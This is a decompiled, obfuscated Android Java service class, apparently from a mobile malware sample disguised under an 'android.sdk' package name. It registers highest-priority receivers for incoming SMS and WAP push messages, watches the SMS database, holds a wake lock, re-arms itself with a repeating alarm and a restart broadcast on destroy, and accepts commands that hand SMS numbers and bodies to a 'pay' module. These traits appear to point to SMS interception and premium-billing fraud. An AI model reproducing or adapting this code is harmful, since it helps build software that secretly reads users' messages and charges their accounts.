package com.android.sdk.rec;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentFilter.MalformedMimeTypeException;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import com.android.sdk.pay.ActivityTool;

public class SymService
  extends Service
{
  public static boolean a;
  private static final String b = SymService.class.getSimpleName();
  private PowerManager.WakeLock c = null;
  private BroadcastReceiver d = null;
  private BroadcastReceiver e = null;
  private BroadcastReceiver f = null;
  private c g = null;
  private e h;
  private PushRecv i;
  
  public SymService() {}
  
  private void a()
  {
    if (this.c != null)
    {
      this.c.release();
      this.c = null;
    }
  }
  
  private void b(Context paramContext)
  {
    if (this.c == null)
    {
      this.c = ((PowerManager)paramContext.getSystemService("power")).newWakeLock(536870913, getClass().getCanonicalName());
      if (this.c != null) {
        this.c.acquire();
      }
    }
  }
  
  public void a(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent("com.android.sdk_rc.recv.Alarm"), 0);
    paramContext = (AlarmManager)paramContext.getSystemService("alarm");
    long l = SystemClock.elapsedRealtime();
    paramContext.setRepeating(2, SystemClock.elapsedRealtime(), 1800000L, localPendingIntent);
    ActivityTool.b(b, l + " " + SystemClock.elapsedRealtime());
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    ActivityTool.b(b, "onBind" + paramIntent.toString());
    return null;
  }
  
  public void onCreate()
  {
    ActivityTool.b(b, "onCreate");
    a = true;
    this.h = new e();
    Object localObject1 = new IntentFilter();
    ((IntentFilter)localObject1).addAction("android.provider.Telephony.SMS_RECEIVED");
    ((IntentFilter)localObject1).addAction("android.provider.Telephony.SMS_DELIVER");
    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
    registerReceiver(this.h, (IntentFilter)localObject1);
    this.i = new PushRecv();
    try
    {
      localIntentFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED", "application/vnd.wap.mms-message");
    }
    catch (IntentFilter.MalformedMimeTypeException localMalformedMimeTypeException2)
    {
      IntentFilter localIntentFilter;
      label96:
      for (;;) {}
    }
    try
    {
      localIntentFilter.addDataType("application/vnd.wap.sic");
      localIntentFilter.addDataType("application/vnd.wap.slc");
      localObject1 = localIntentFilter;
    }
    catch (IntentFilter.MalformedMimeTypeException localMalformedMimeTypeException1)
    {
      Object localObject2 = localMalformedMimeTypeException2;
      break label96;
    }
    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
    registerReceiver(this.i, (IntentFilter)localObject1);
    this.g = new c(new Handler(), this);
    localObject1 = Uri.parse("content://sms");
    getContentResolver().registerContentObserver((Uri)localObject1, true, this.g);
    this.d = new d();
    localObject1 = new IntentFilter();
    ((IntentFilter)localObject1).addAction("android.intent.action.USER_PRESENT");
    ((IntentFilter)localObject1).addAction("android.intent.action.SCREEN_ON");
    ((IntentFilter)localObject1).addAction("android.intent.action.SCREEN_OFF");
    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
    registerReceiver(this.d, (IntentFilter)localObject1);
    this.e = new b();
    localObject1 = new IntentFilter();
    ((IntentFilter)localObject1).addAction("android.intent.action.TIME_SET");
    ((IntentFilter)localObject1).addAction("android.intent.action.DATE_CHANGED");
    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
    registerReceiver(this.e, (IntentFilter)localObject1);
    this.f = new a();
    localObject1 = new IntentFilter("com.android.sdk_rc.recv.Alarm");
    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
    registerReceiver(this.f, (IntentFilter)localObject1);
    a(this);
    b(this);
    ActivityTool.checkAppStatus(this);
    super.onCreate();
  }
  
  public void onDestroy()
  {
    ActivityTool.b(b, "onDestroy");
    a = false;
    unregisterReceiver(this.h);
    unregisterReceiver(this.i);
    getContentResolver().unregisterContentObserver(this.g);
    unregisterReceiver(this.d);
    unregisterReceiver(this.e);
    unregisterReceiver(this.f);
    a();
    Intent localIntent = new Intent();
    localIntent.setAction("com.android.sdk.rec.action.RORecv");
    sendBroadcast(localIntent);
    super.onDestroy();
  }
  
  public void onRebind(Intent paramIntent)
  {
    ActivityTool.b(b, "onRebind");
    super.onRebind(paramIntent);
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    ActivityTool.b(b, "onStart");
    super.onStart(paramIntent, paramInt);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    ActivityTool.b(b, "onStartCommand");
    String str;
    if (paramIntent != null)
    {
      ActivityTool.b(b, "onStartCommand intent=" + paramIntent.toString());
      str = ActivityTool.a(paramIntent.getAction());
      ActivityTool.b(b, str);
      if (!str.equals("com.android.sdk.rec.cmd.WapCfg")) {
        break label91;
      }
      com.android.sdk.pay.c.a().a(this, paramIntent.getIntExtra("wapid", 0));
    }
    for (;;)
    {
      return super.onStartCommand(paramIntent, paramInt1, paramInt2);
      label91:
      if (str.equals("com.android.sdk.rec.cmd.WapCfgCust")) {
        com.android.sdk.pay.c.a().b(this, paramIntent.getIntExtra("cmd", 0));
      } else if (str.equals("com.android.sdk.rec.cmd.WapCfgUpload")) {
        com.android.sdk.pay.c.a().a(this, paramIntent.getIntExtra("cmd", 0), paramIntent.getCharSequenceExtra("smsNum").toString(), paramIntent.getCharSequenceExtra("smsBody").toString());
      }
    }
  }
  
  public boolean onUnbind(Intent paramIntent)
  {
    ActivityTool.b(b, "onUnbind");
    return super.onUnbind(paramIntent);
  }
}
